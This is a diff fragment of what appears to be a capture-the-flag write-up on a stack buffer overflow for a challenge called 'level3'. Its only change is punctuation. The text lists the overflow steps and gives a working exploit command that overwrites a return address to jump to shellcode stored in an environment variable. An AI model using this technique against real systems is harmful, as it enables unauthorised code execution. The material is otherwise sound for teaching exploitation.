@@ -102,9 +102,9 @@ For all the steps describe before to work, the layot of the stack of function **
 ![Logo](/assets/images/bm3-1.png)
 
 Steps:
-* We need a payload of 16 characters in **a**
+* We need a payload of 16 characters in **a**.
 * We need to put 32 bytes in **buf1** from **b** in order to overwrite the return address. 
-* We'll use the same trick with the shellcode placed in an environment variable
+* We'll use the same trick with the shellcode placed in an environment variable.
 
 ```bash
 $ ./level3 $(python -c 'print "B"*16') $(python -c 'print "C"*32 + "\xd3\xd8\xff\xff"')
